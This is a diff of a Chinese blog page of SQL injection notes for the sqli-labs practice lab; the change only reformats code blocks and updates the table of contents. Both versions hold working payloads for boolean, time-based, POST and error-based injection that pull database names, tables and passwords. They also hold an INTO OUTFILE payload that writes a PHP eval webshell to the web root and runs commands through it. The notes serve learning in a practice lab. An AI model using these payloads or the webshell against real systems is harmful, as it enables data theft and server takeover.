@@ -216,7 +216,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="c:/Users/dell/Pictures/各种截图/报错盲注.png">
 <meta property="article:published_time" content="2021-10-15T09:13:35.491Z">
-<meta property="article:modified_time" content="2021-10-15T09:14:03.751Z">
+<meta property="article:modified_time" content="2021-10-17T12:39:28.902Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="c:/Users/dell/Pictures/各种截图/报错盲注.png">
@@ -441,39 +441,65 @@
     
 
     
-    <h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h3><p>尝试1‘ / 1’‘ 等，将and前的引号闭合</p>
-<h3 id="猜测长度"><a href="#猜测长度" class="headerlink" title="猜测长度:"></a>猜测长度:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (length(database()))&gt;11--+</span><br></pre></td></tr></table></figure>
+    <h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h2><p>尝试1‘ / 1’‘ 等，将and前的引号闭合</p>
+<h2 id="猜测长度"><a href="#猜测长度" class="headerlink" title="猜测长度:"></a>猜测长度:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (length(database()))&gt;11--+</span><br></pre></td></tr></table></figure>
 
 <p>页面返回有数据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (length(database()))&gt;12--+</span><br></pre></td></tr></table></figure>
 
 <p>页面无结果返回则当前数据库名称长度为: 12</p>
-<h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1)) &gt;100--+</span><br></pre></td></tr></table></figure>
+<h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1)) &gt;100--+</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">根据二分法判断</span><br><span class="line"></span><br><span class="line">`SUBSTR(str,pos)`:  pos开始的位置，—直截取到最后</span><br><span class="line"></span><br><span class="line">`SUBSTR(str,pos,len)`:  从 pos开始的位置，截取len个字符</span><br><span class="line"></span><br><span class="line">`substr(string ,<span class="number">1</span>,<span class="number">3</span>)`: 取string左边第<span class="number">1</span>位置起，<span class="number">3</span>字长的字符串。所以结果为: str</span><br><span class="line"></span><br><span class="line">`substr(string, <span class="number">-1</span>,<span class="number">3</span>)`: 取string右边第<span class="number">1</span>位置起，<span class="number">3</span>字长的字符串。显然右边第一位置起往右不够<span class="number">3</span>字长。结果只能是: g</span><br><span class="line"></span><br><span class="line">`substr(string,<span class="number">-3</span>,<span class="number">3</span>)`: 取string右边第<span class="number">3</span>位置起，字长的字符串,结果为: ing</span><br><span class="line"></span><br><span class="line">`?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))=107--+`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 页面返回有数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">97</span><span class="comment">--+` </span></span><br><span class="line"></span><br><span class="line">页面返回有数据</span><br><span class="line"></span><br><span class="line">当前数据库 第一个字母是k,第二个字母是a...以此类可推得到数据库库名</span><br><span class="line"></span><br><span class="line">### 爆表名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101--+`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;e&#x27;</span><span class="comment">--+`</span></span><br></pre></td></tr></table></figure>
-
+<p>根据二分法判断</p>
+<p><code>SUBSTR(str,pos)</code>:  pos开始的位置，—直截取到最后</p>
+<p><code>SUBSTR(str,pos,len)</code>:  从 pos开始的位置，截取len个字符</p>
+<p><code>substr(string ,1,3)</code>: 取string左边第1位置起，3字长的字符串。所以结果为: str</p>
+<p><code>substr(string, -1,3)</code>: 取string右边第1位置起，3字长的字符串。显然右边第一位置起往右不够3字长。结果只能是: g</p>
+<p><code>substr(string,-3,3)</code>: 取string右边第3位置起，字长的字符串,结果为: ing</p>
+<p><code>?id=1&#39; and ascii(substr(database(),1,1))=107--+</code></p>
+<p> 页面返回有数据</p>
+<p><code>?id=1&#39; and ascii(substr(database(),2,1))=97--+</code> </p>
+<p>页面返回有数据</p>
+<p>当前数据库 第一个字母是k,第二个字母是a…以此类可推得到数据库库名</p>
+<h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><p><code>?id=1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101--+</code></p>
+<p><code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39;--+</code></p>
 <ul>
 <li>left()函数</li>
 </ul>
 <p>![img](C:\Users\dell\Documents\Tencent Files\2080709384\Image\C2C\9V87@3ZJ4@6S{SA]_DO`XYT.png)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">### 爆列名</span><br><span class="line"></span><br><span class="line">`?id=1&#x27;and (ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1)))&gt;102--+ `</span><br><span class="line"></span><br><span class="line">爆出列名之后可以再确认一下：</span><br><span class="line"></span><br><span class="line">`?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()limit 2,1),8)=&#x27;password&#x27;--+`</span><br><span class="line"></span><br><span class="line">### 爆内容</span><br><span class="line"></span><br><span class="line">`?id=1&#x27;and (ascii(substr(( select password from users limit 0,1),1,1)))=122--+ `</span><br><span class="line"></span><br><span class="line">爆出列名之后可以再确认一下：</span><br><span class="line"></span><br><span class="line">`?id=1&#x27; and left((select password from users limit 0,1),4)=&#x27;dumb&#x27;--+ `</span><br><span class="line"></span><br><span class="line"> 页面返回有数据则正确</span><br><span class="line"></span><br><span class="line">## outfile/ sqllab—7</span><br><span class="line"></span><br><span class="line">将内容输出到与本页面同步的文件，写入木马</span><br><span class="line"></span><br><span class="line">`?id=1&#x27;))  union select 1,&quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot;,3 into outfile &quot;/var/www/html/a.php&quot; --+`</span><br><span class="line"></span><br><span class="line">`/var/www/html/`是web服务器的默认根文件夹，题目的文件都在这</span><br><span class="line"></span><br><span class="line">把内容写入a.php后可以通过访问a.php，并通过hackbar给a赋值?a=system(&#x27;ls&#x27;);</span><br><span class="line"></span><br><span class="line"># 时间盲注</span><br><span class="line"></span><br><span class="line">利用`if(判断语句,sleep(5),1)`若正确页面延迟5秒，若错误将直接刷新</span><br><span class="line"></span><br><span class="line"># POST盲注</span><br></pre></td></tr></table></figure>
-
-
-
-<p>![屏幕截图 2021-10-06 190904](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-06 190904.png)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">用post传参并布尔盲注：</span><br><span class="line"></span><br><span class="line">`uname=admin&#x27; and 1=1#&amp; passwd=passwd&#x27;#`判断是否回显（若不回显则时间盲注）</span><br><span class="line"></span><br><span class="line">`uname=admin&#x27; order by 2#&amp; passwd=passwd&#x27;#`判断列数</span><br><span class="line"></span><br><span class="line">post传参注释使用‘#’</span><br><span class="line"></span><br><span class="line">爆库名的paylod:</span><br><span class="line"></span><br><span class="line">`uname=-admin&#x27; union select 1,group_concat(schema_name) from information_schema.schemata#&amp;passwd=passwd&#x27; #`</span><br><span class="line"></span><br><span class="line">uname传参后先注释，然后写&amp;passwd=passwd&#x27;，密码的值可以变，uname的值只能为admin</span><br><span class="line"></span><br><span class="line">用post传参并时间盲注：</span><br><span class="line"></span><br><span class="line">利用`if(判断语句,sleep(5),1)`若正确页面延迟5秒，若错误将直接刷新</span><br><span class="line"></span><br><span class="line">if(left(database(),8)=&#x27;security&#x27;,1,sleep(5))</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">updatexml函数是mysql对xml文档数据进行查询和修改的xpath函数，而extractvalue函数比updatexml函数少了一个修改功能，也就是只进行xml文档数据的查询。</span><br><span class="line"></span><br><span class="line">updateml的语法是：</span><br><span class="line"></span><br><span class="line">updatexml(xml_document,XPathstring,new_value)要求xpath定位是准确的，如果不准确，就会发生错误，要利用的就是这个特性。直接在输入框内拼接语句：`updatexml(1,concat(0x7e,database()),0)`</span><br><span class="line"></span><br><span class="line">extractvalue的语法是：</span><br><span class="line"></span><br><span class="line">extractvalue(xml_document,XPathstring)。语句：`extractvalue(1,concat(0x7e,database()))`</span><br></pre></td></tr></table></figure>
-
-
-
+<h2 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h2><p><code>?id=1&#39;and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)))&gt;102--+ </code></p>
+<p>爆出列名之后可以再确认一下：</p>
+<p><code>?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()limit 2,1),8)=&#39;password&#39;--+</code></p>
+<h2 id="爆内容"><a href="#爆内容" class="headerlink" title="爆内容"></a>爆内容</h2><p><code>?id=1&#39;and (ascii(substr(( select password from users limit 0,1),1,1)))=122--+ </code></p>
+<p>爆出列名之后可以再确认一下：</p>
+<p><code>?id=1&#39; and left((select password from users limit 0,1),4)=&#39;dumb&#39;--+ </code></p>
+<p> 页面返回有数据则正确</p>
+<h2 id="outfile-sqllab—7"><a href="#outfile-sqllab—7" class="headerlink" title="outfile/ sqllab—7"></a>outfile/ sqllab—7</h2><p>将内容输出到与本页面同步的文件，写入木马</p>
+<p><code>?id=1&#39;))  union select 1,&quot;&lt;?php @eval($_GET[&#39;a&#39;]);?&gt;&quot;,3 into outfile &quot;/var/www/html/a.php&quot; --+</code></p>
+<p><code>/var/www/html/</code>是web服务器的默认根文件夹，题目的文件都在这</p>
+<p>把内容写入a.php后可以通过访问a.php，并通过hackbar给a赋值?a=system(‘ls’);</p>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>利用<code>if(判断语句,sleep(5),1)</code>若正确页面延迟5秒，若错误将直接刷新</p>
+<h1 id="POST盲注"><a href="#POST盲注" class="headerlink" title="POST盲注"></a>POST盲注</h1><p>![屏幕截图 2021-10-06 190904](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-06 190904.png)</p>
+<p>用post传参并布尔盲注：</p>
+<p><code>uname=admin&#39; and 1=1#&amp; passwd=passwd&#39;#</code>判断是否回显（若不回显则时间盲注）</p>
+<p><code>uname=admin&#39; order by 2#&amp; passwd=passwd&#39;#</code>判断列数</p>
+<p>post传参注释使用‘#’</p>
+<p>爆库名的paylod:</p>
+<p><code>uname=-admin&#39; union select 1,group_concat(schema_name) from information_schema.schemata#&amp;passwd=passwd&#39; #</code></p>
+<p>uname传参后先注释，然后写&amp;passwd=passwd’，密码的值可以变，uname的值只能为admin</p>
+<p>用post传参并时间盲注：</p>
+<p>利用<code>if(判断语句,sleep(5),1)</code>若正确页面延迟5秒，若错误将直接刷新</p>
+<p>if(left(database(),8)=’security’,1,sleep(5))</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>updatexml函数是mysql对xml文档数据进行查询和修改的xpath函数，而extractvalue函数比updatexml函数少了一个修改功能，也就是只进行xml文档数据的查询。</p>
+<p>updateml的语法是：</p>
+<p>updatexml(xml_document,XPathstring,new_value)要求xpath定位是准确的，如果不准确，就会发生错误，要利用的就是这个特性。直接在输入框内拼接语句：<code>updatexml(1,concat(0x7e,database()),0)</code></p>
+<p>extractvalue的语法是：</p>
+<p>extractvalue(xml_document,XPathstring)。语句：<code>extractvalue(1,concat(0x7e,database()))</code></p>
 <h3 id="sqli-lab-17题"><a href="#sqli-lab-17题" class="headerlink" title="sqli lab-17题"></a>sqli lab-17题</h3><p><img src="C:\Users\dell\Pictures\各种截图\报错盲注.png" alt="报错盲注"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">从头开始看，需要传uname和passwd的值，不然进行不下去，下面显示print_r(mysql_error())说明报错注入，则现在需要paylod爆库名：</span><br><span class="line"></span><br><span class="line">`uname=admin &amp; passwd=password&#x27; and extractvalue(1,concat(&#x27;~&#x27;,database()))#`</span><br><span class="line"></span><br><span class="line">爆表名:</span><br><span class="line"></span><br><span class="line">`uname=admin &amp; passwd=password&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))#`</span><br></pre></td></tr></table></figure>
-
-
-
+<p>从头开始看，需要传uname和passwd的值，不然进行不下去，下面显示print_r(mysql_error())说明报错注入，则现在需要paylod爆库名：</p>
+<p><code>uname=admin &amp; passwd=password&#39; and extractvalue(1,concat(&#39;~&#39;,database()))#</code></p>
+<p>爆表名:</p>
+<p><code>uname=admin &amp; passwd=password&#39; and extractvalue(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)))#</code></p>
 
     
     
@@ -630,7 +656,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AD%E5%90%88"><span class="toc-number">1.1.</span> <span class="toc-text">闭合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E6%B5%8B%E9%95%BF%E5%BA%A6"><span class="toc-number">1.2.</span> <span class="toc-text">猜测长度:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93%E5%90%8D"><span class="toc-number">1.3.</span> <span class="toc-text">爆库名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-lab-17%E9%A2%98"><span class="toc-number">0.1.</span> <span class="toc-text">sqli lab-17题</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AD%E5%90%88"><span class="toc-number">1.1.</span> <span class="toc-text">闭合</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8C%9C%E6%B5%8B%E9%95%BF%E5%BA%A6"><span class="toc-number">1.2.</span> <span class="toc-text">猜测长度:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E5%BA%93%E5%90%8D"><span class="toc-number">1.3.</span> <span class="toc-text">爆库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-number">1.4.</span> <span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E5%88%97%E5%90%8D"><span class="toc-number">1.5.</span> <span class="toc-text">爆列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E5%86%85%E5%AE%B9"><span class="toc-number">1.6.</span> <span class="toc-text">爆内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#outfile-sqllab%E2%80%947"><span class="toc-number">1.7.</span> <span class="toc-text">outfile&#x2F; sqllab—7</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POST%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">POST盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-lab-17%E9%A2%98"><span class="toc-number">4.0.1.</span> <span class="toc-text">sqli lab-17题</span></a></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
